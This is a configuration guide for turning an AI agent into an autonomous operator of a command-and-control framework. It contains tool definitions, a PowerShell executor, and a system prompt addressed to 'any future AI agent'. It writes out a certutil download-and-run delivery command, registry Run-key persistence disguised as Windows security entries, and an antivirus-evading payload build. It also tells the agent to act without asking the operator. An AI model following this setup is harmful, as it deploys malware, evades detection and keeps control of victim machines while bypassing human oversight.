# HERMES TOOL USE WORKFLOW
## Ingestible by any AI agent — VADER Shell, CHEYANNE AI, WhatsApp gateway, etc.

---

## WHAT THIS IS

A configuration reference for giving an AI agent (Hermes/Kimi/VADER) tool use capability
for C2 operations. Any future agent can ingest this document and replicate the setup.

---

## ARCHITECTURE

```
Operator (phone/terminal)
        ↓
   AI Brain (Kimi K2.5 via OpenRouter)
        ↓ tool calls
   Tool Dispatcher (terminal tool on operator machine)
        ↓
   Pentesting Tools (netstat, powershell, listener.py commands)
        ↓
   C2 Channel (Discord #c2 / TCP shell / beacon)
        ↓
   Target (Radon_Laptop1 / any authorized target)
```

---

## HERMES CONFIG CHANGES FOR TOOL USE

File: `C:\Users\gwu07\AppData\Local\hermes\config.yaml`

### 1. Add terminal + file to Discord platform toolsets

```yaml
platform_toolsets:
  discord:
  - hermes-discord
  - terminal        # ← gives Kimi ability to run commands on operator machine
  - file            # ← gives Kimi ability to read/write files
```

### 2. C2 channel system prompt (channel ID: 1518584455411925193)

```yaml
discord:
  channel_prompts:
    "1518584455411925193": |
      You are PALPATINE, CHEYANNE C2 operator AI. Translate shorthand to JSON commands immediately.

      SHORTHAND VOCAB:
      "drop ghost <sid>"  → certutil download ghost_loader.exe to C:\Users\Public\ on session <sid>
      "run ghost <sid>"   → start /b C:\Users\Public\ghost_loader.exe on session <sid>
      "deliver <sid>"     → drop ghost THEN run ghost (full sequence)
      "whoami <sid>"      → run whoami on session <sid>
      "persist <sid>"     → set HKCU Run keys for svchost_update.exe + ghost_loader.exe
      "sessions"          → list heartbeating session IDs
      "diagnose"          → full TCP diagnostic
      "check tcp"         → netstat + log tail, report TCP shell status

      HTTP server: http://192.168.1.92:8080/
      C2 listener: 192.168.1.92:4443
      Always drop to C:\Users\Public\ (no spaces, writable).
      Format: {"type": "cmd", "session": "<sid>", "command": "<cmd>"}

      AUTO-TROUBLESHOOT (run when TCP shell missing):
      1. terminal tool: netstat -ano | findstr :4443
      2. terminal tool: Get-Content C:\Users\gwu07\Desktop\cheyanne\PENTEST_LOG.md -Tail 15
      3. terminal tool: netstat -ano | findstr :8080
      4. Dispatch A/B/C based on findings. Run tools yourself — don't ask the operator.
```

### 3. Restart Hermes after config change

Discord C2 bot token is in `.env` at `C:\Users\gwu07\AppData\Local\hermes\.env`.
Restart whichever process runs the Hermes Discord gateway.

---

## TOOL DEFINITIONS (for embedding in any AI agent)

If building a custom agent (VADER WhatsApp, standalone AI listener, etc.),
use these OpenAI-compatible tool definitions:

```python
C2_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "run_powershell",
            "description": "Run a PowerShell command on the operator machine (192.168.1.92) and return output",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "PowerShell command to run"}
                },
                "required": ["command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "send_beacon_cmd",
            "description": "Send a command to a target via the Discord C2 beacon channel",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "8-char hex session ID from heartbeat"},
                    "command": {"type": "string", "description": "CMD.EXE command to run on target"}
                },
                "required": ["session_id", "command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "check_tcp_status",
            "description": "Check if TCP shells are connected to listener.py on port 4443",
            "parameters": {"type": "object", "properties": {}}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "read_c2_log",
            "description": "Read the last N lines of the CHEYANNE PENTEST_LOG to see session history",
            "parameters": {
                "type": "object",
                "properties": {
                    "lines": {"type": "integer", "description": "Number of log lines to read", "default": 20}
                }
            }
        }
    }
]
```

Tool executor (wire this to actual subprocess calls):

```python
import subprocess, json

def execute_tool(name, args):
    if name == "run_powershell":
        r = subprocess.run(
            ["powershell", "-c", args["command"]],
            capture_output=True, text=True, timeout=30
        )
        return r.stdout or r.stderr

    elif name == "check_tcp_status":
        r = subprocess.run(
            ["powershell", "-c", "netstat -ano | findstr :4443"],
            capture_output=True, text=True
        )
        log = subprocess.run(
            ["powershell", "-c",
             "Get-Content C:\\Users\\gwu07\\Desktop\\cheyanne\\PENTEST_LOG.md -Tail 10"],
            capture_output=True, text=True
        )
        return f"NETSTAT:\n{r.stdout}\n\nLOG:\n{log.stdout}"

    elif name == "send_beacon_cmd":
        # Post JSON to Discord #c2 channel via bot
        # (implement via discord.py or REST API with bot token)
        msg = json.dumps({
            "type": "cmd",
            "session": args["session_id"],
            "command": args["command"]
        })
        return f"Dispatched to {args['session_id']}: {msg}"

    elif name == "read_c2_log":
        n = args.get("lines", 20)
        r = subprocess.run(
            ["powershell", "-c",
             f"Get-Content C:\\Users\\gwu07\\Desktop\\cheyanne\\PENTEST_LOG.md -Tail {n}"],
            capture_output=True, text=True
        )
        return r.stdout
```

---

## SYSTEM PROMPT FOR ANY FUTURE AI AGENT

Paste this as the system prompt when building a new AI agent for C2 operations:

```
You are an AI C2 operator for CHEYANNE framework (22DIV / rainfantry).
You have tool access to the operator machine (192.168.1.92) and C2 infrastructure.

ENVIRONMENT:
- Operator machine: 192.168.1.92 (Windows 11)
- Target: Radon_Laptop1 (192.168.1.145) — authorized, Raed's machine
- TCP C2 listener: listener.py on 192.168.1.92:4443
- Discord C2: bot SERVITOR in #c2 channel (beacon relay)
- HTTP payload server: python -m http.server 8080 from cheyanne/shell/
- Ghost loader: C:\Users\gwu07\Desktop\cheyanne\shell\ghost_loader.exe
- FUD version: C:\Users\gwu07\Desktop\cheyanne\shell\ghost_fud.exe (use this for delivery)
- PENTEST_LOG: C:\Users\gwu07\Desktop\cheyanne\PENTEST_LOG.md

PERSISTENCE MECHANISM:
- HKCU\Run\WindowsSecurityHealth → C:\Users\Public\svchost_update.exe (Discord beacon)
- HKCU\Run\WindowsSecurityUpdate → C:\Users\Public\ghost_loader.exe (TCP shell)
- Registry Run keys fire on NEXT USER LOGIN — not immediately
- To fire immediately: execute binary via live beacon session

DELIVERY COMMAND (CMD.EXE syntax — use this exactly):
taskkill /F /IM ghost_loader.exe 2>nul & certutil -urlcache -split -f "http://192.168.1.92:8080/ghost_fud.exe" "C:\Users\Public\ghost_loader.exe" & start /B "" "C:\Users\Public\ghost_loader.exe"

DIAGNOSTIC SEQUENCE (run when TCP shells = 0):
1. run_powershell: netstat -ano | findstr :4443
   - Two LISTENING PIDs → kill lower PID (taskkill /PID <pid> /F)
   - ESTABLISHED → shell connected, report session
2. run_powershell: netstat -ano | findstr :8080
   - Nothing → HTTP server dead, tell operator to restart
3. read_c2_log: check for NEW SESSION entries
4. If nothing: re-deliver via beacon using delivery command above

DECISION MATRIX:
- 0 shells, beacon alive, HTTP up → re-deliver via beacon
- 0 shells, beacon alive, HTTP down → start HTTP server first
- 0 shells, no beacon → check svchost_update.exe on target
- Shell connects then drops → AV killed binary, rebuild with fud_auto.py
- Two listeners on 4443 → kill old PID, keep newest
```

---

## KEY INSIGHT: ghost_fud.exe vs ghost_loader.exe

| | ghost_loader.exe | ghost_fud.exe |
|--|--|--|
| Use case | Testing | Production delivery |
| AV detection | May flag | CLEAN (seed=66728) |
| Build command | `python build_ghost_loader.py 192.168.1.92 4443` | `python fud_auto.py ghost 192.168.1.92 4443` |
| Delivery name | Deploy AS ghost_loader.exe | Deliver AS ghost_loader.exe (rename on drop) |

Always deliver ghost_fud.exe but save it AS ghost_loader.exe on target
(persistence registry key points to ghost_loader.exe).

Delivery command renames automatically:
`certutil ... ghost_fud.exe ... C:\Users\Public\ghost_loader.exe`
